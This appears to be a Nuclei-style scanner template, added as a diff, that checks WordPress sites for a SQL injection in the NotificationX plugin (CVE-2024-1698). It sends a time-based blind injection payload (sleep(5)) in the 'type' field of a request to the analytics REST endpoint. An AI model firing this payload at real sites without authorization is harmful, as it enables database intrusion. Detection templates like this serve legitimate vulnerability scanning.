@@ -1,0 +1,25 @@
+id: wordpress-notification-analytics-sqli
+
+info:
+  name: wordpress-notification-analytics-sqli
+  author: xiaokp7
+  severity: critical
+  description: WordPress Plugin NotificationX SQL注入漏洞(CVE-2024-1698)
+
+http:
+  - raw:
+      - |
+        POST /wp-json/notificationx/v1/analytics HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"nx_id": "1","type": "clicks`=1 and 1=sleep(5)-- -"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 200'
+          - 'contains(body, "{\"success\":true}")'
+          - 'contains(header, "application/json")'
+        condition: and
